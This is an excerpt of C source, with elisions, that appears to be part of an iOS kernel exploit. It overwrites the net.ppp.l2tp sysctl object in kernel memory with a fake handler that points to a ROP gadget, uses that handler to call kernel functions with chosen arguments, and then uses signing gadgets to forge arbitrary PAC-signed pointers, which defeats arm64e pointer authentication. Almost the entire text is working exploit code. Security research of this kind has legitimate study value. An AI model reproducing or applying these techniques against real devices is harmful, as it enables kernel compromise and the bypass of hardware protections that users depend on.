...
static size_t SIZE(sysctl_oid)                = 0x50;
static size_t OFFSET(sysctl_oid, oid_parent)  =  0x0;
static size_t OFFSET(sysctl_oid, oid_link)    =  0x8;
static size_t OFFSET(sysctl_oid, oid_kind)    = 0x14;
static size_t OFFSET(sysctl_oid, oid_handler) = 0x30;
static size_t OFFSET(sysctl_oid, oid_version) = 0x48;
static size_t OFFSET(sysctl_oid, oid_refcnt)  = 0x4c;
...
stage1_init_kernel_pacxa_forging() {
    ...
    uint64_t paciza__l2tp_domain_module_start = cached_offsets.paciza_pointer__l2tp_domain_module_start;
    uint64_t paciza__l2tp_domain_module_stop = cached_offsets.paciza_pointer__l2tp_domain_module_stop;

	// Read out the original value of sysctl__net_ppp_l2tp__data.
	uint8_t sysctl__net_ppp_l2tp__data[SIZE(sysctl_oid)];
	kread(cached_offsets.sysctl__net_ppp_l2tp, sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
	...
	FIELD(fake_sysctl_oid, sysctl_oid, oid_parent,  uint64_t) = cached_offsets.sysctl__net_ppp_l2tp + OFFSET(sysctl_oid, oid_link);
	FIELD(fake_sysctl_oid, sysctl_oid, oid_link,    uint64_t) = cached_offsets.sysctl__net_ppp_l2tp;
	FIELD(fake_sysctl_oid, sysctl_oid, oid_kind,    uint32_t) = 0x400000;
    FIELD(fake_sysctl_oid, sysctl_oid, oid_handler, uint64_t) = cached_offsets.mov_x0_x4__br_x5;
	...
	kernel_write(cached_offsets.sysctl__net_ppp_l2tp, fake_sysctl_oid, SIZE(sysctl_oid));
	...
	DEBUG_TRACE(1, "%s(): 0x%08x; l2tp_domain_inited = %d",
			...
			kernel_read32(cached_offsets.l2tp_domain_inited));
	...
	uint64_t handler = kernel_read64(cached_offsets.sysctl__net_ppp_l2tp + OFFSET(sysctl_oid, oid_handler));
	...
	kernel_write(cached_offsets.sysctl__net_ppp_l2tp, sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
	ret = stage1_kernel_call_7(
			paciza__mov_x0_x4__br_x5,	// PC
			0, 0, 0,			// X1 - X3
			cached_offsets.sysctl__net_ppp_l2tp,	// X4
			cached_offsets.sysctl_unregister_oid,	// X5
			0);				// X6
	DEBUG_TRACE(2, "%s(%016llx) = 0x%08x", "sysctl_unregister_oid",
			cached_offsets.sysctl__net_ppp_l2tp, ret);
...
stage2_kernel_forge_pacxa(uint64_t address, uint64_t context, bool instruction) {
	...
	if (instruction) {
		...
		pacxa_gadget = cached_offsets.kernel_forge_pacia_gadget;
	} else {
		result_address += OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result);
		pacxa_gadget = cached_offsets.kernel_forge_pacda_gadget;
	}
	// We need to set:
	//
	// 	x2  = buffer_address
	...
	ret = stage1_kernel_call_7(
			paciza__mov_x0_x4__br_x5,	// PC
			cached_offsets.mov_x10_x3__br_x6,	// X1
			buffer_address,			// X2
			context,			// X3
			address,			// X4
			cached_offsets.mov_x9_x0__br_x1,	// X5
			pacxa_gadget);			// X6
